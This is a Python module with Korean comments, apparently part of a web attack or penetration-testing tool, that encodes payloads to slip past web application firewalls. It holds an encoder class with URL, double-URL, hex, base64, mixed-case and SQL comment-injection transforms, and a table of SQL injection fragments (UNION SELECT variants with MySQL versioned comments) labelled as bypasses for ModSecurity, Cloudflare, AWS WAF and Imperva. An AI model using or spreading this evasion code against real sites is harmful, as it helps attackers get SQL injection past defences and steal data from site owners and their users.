# app/core/utils/encoding.py
# 페이로드 인코딩 다양화 (WAF 우회용)

import base64
import urllib.parse
from typing import List


class PayloadEncoder:
    """
    다양한 인코딩 기법을 제공하는 페이로드 인코더
    """
    
    @staticmethod
    def url_encode(payload: str) -> str:
        """URL 인코딩"""
        return urllib.parse.quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        """이중 URL 인코딩"""
        return urllib.parse.quote(urllib.parse.quote(payload))
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        """Unicode 인코딩"""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        """Base64 인코딩"""
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        """Hex 인코딩"""
        return payload.encode().hex()
    
    @staticmethod
    def html_entity_encode(payload: str) -> str:
        """HTML Entity 인코딩"""
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    @staticmethod
    def mixed_case(payload: str) -> str:
        """대소문자 혼합 (SQL 키워드 우회)"""
        result = []
        for i, char in enumerate(payload):
            if char.isalpha():
                result.append(char.upper() if i % 2 == 0 else char.lower())
            else:
                result.append(char)
        return ''.join(result)
    
    @staticmethod
    def comment_injection(payload: str, db_type: str = "mysql") -> str:
        """주석 삽입으로 우회"""
        if db_type == "mysql":
            return payload.replace(" ", "/**/").replace("AND", "/**/AND/**/")
        elif db_type == "mssql":
            return payload.replace(" ", "/**/").replace("--", "/*--*/")
        return payload
    
    @staticmethod
    def get_all_encodings(payload: str) -> List[str]:
        """모든 인코딩 변형 반환"""
        encodings = [
            payload,  # 원본
            PayloadEncoder.url_encode(payload),
            PayloadEncoder.double_url_encode(payload),
            PayloadEncoder.base64_encode(payload),
            PayloadEncoder.hex_encode(payload),
            PayloadEncoder.mixed_case(payload),
            PayloadEncoder.comment_injection(payload, "mysql"),
            PayloadEncoder.comment_injection(payload, "mssql"),
        ]
        return encodings


class WAFBypass:
    """
    WAF별 우회 페이로드 데이터베이스
    """
    
    # ModSecurity 우회
    MODSECURITY_BYPASS = [
        "/*!50000SELECT*/",
        "/*!50000UNION*/",
        "/**/UNION/**/SELECT",
        "UNION/*!50000SELECT*/",
    ]
    
    # Cloudflare 우회
    CLOUDFLARE_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION ALL SELECT",
        "/*!50000UNION*//*!50000SELECT*/",
    ]
    
    # AWS WAF 우회
    AWS_WAF_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION/**/SELECT",
    ]
    
    # Imperva 우회
    IMPERVA_BYPASS = [
        "UNION SELECT",
        "UNION/*!50000SELECT*/",
        "UNION/**/SELECT/**/",
    ]
    
    @staticmethod
    def get_bypass_payloads(waf_type: str = None) -> List[str]:
        """WAF 타입별 우회 페이로드 반환"""
        if waf_type == "modsecurity":
            return WAFBypass.MODSECURITY_BYPASS
        elif waf_type == "cloudflare":
            return WAFBypass.CLOUDFLARE_BYPASS
        elif waf_type == "aws":
            return WAFBypass.AWS_WAF_BYPASS
        elif waf_type == "imperva":
            return WAFBypass.IMPERVA_BYPASS
        else:
            # 모든 WAF 우회 페이로드 반환
            return (
                WAFBypass.MODSECURITY_BYPASS +
                WAFBypass.CLOUDFLARE_BYPASS +
                WAFBypass.AWS_WAF_BYPASS +
                WAFBypass.IMPERVA_BYPASS
            )

